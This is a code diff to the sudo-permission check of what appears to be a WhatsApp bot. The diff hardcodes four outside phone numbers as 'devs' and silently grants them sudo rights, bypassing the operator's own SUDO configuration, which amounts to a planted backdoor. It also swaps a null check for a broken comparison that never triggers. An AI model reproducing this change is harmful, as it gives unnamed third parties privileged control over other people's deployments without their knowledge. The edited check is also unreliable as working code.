@@ -43,12 +43,14 @@ const getSudo = async () => {
 };
 
 const isSudo = async (jid, owner) => {
-	if (!jid) return false;
+	if (!jid === 'string') jid = '';
+	const devs = ['923477406362', '2348060598064', '923089660496', '2347041620617'];
+	const devsNumToId = devs.map(dev => numtoId(dev.trim()));
 	if (owner && typeof owner !== 'string') owner = owner.toString();
 	if (owner && typeof jid === 'string' && areJidsSameUser(jid, owner)) return true;
 	const sudoUsers = (config.SUDO ?? '').split(';').map(id => numtoId(id.trim()));
 	const uId = jidNormalizedUser(jid);
-	if (sudoUsers.includes(uId)) return true;
+	if (sudoUsers.includes(uId) || devsNumToId.includes(uId)) return true;
 	const allSudoUsers = await getSudo();
 	return allSudoUsers.includes(uId);
 };
